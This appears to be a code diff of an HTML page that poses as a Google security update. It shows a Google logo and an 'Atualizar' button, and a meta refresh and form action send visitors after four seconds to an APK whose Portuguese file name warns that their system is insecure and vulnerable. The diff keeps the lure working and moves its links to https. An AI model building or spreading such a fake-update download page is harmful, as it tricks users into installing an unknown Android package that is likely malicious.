@@ -1,6 +1,4 @@
-<!DOCTYPE html> 
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
+     
 	 
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="description" content="">
@@ -33,8 +31,8 @@
 </head>
  
   <body class="bg-white">
- <meta http-equiv="refresh" content="4; URL='http://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk'"/>
-<form action="http://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk">
+ <meta http-equiv="refresh" content="4; URL='https://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk'"/>
+<form action="https://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk">
     <div class="container">
       <div class="py-5 text-center">
         <img class="d-block mx-auto mb-4" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" style="width:20%; height:20%;">
@@ -51,6 +49,4 @@
             <button class="btn btn-primary btn-lg btn-block" type="submit">Atualizar</button>
 	   </div>
 	   </div>
-	</form>
-<script> 
-</body></html>
+	 
